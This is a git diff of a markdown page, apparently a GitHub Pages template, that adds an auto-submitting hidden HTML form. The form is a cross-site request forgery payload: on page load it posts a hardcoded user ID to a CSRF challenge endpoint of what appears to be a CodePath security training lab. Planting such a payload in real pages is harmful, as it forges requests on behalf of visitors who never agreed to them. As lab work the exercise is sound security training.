@@ -23,8 +23,12 @@ Syntax highlighted code block
 
 **Bold** and _Italic_ and `Code` text
 
-[Link](url) and ![Image](src)
-```
+<form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+	<input type="hidden" name="userId" value="51c10a3b1562ba3052fe280a648eca8bb58e038f"/>
+	<input type="submit" />
+</form>
+<script> document.csrfForm.submit(); </script>
+
 
 For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
 
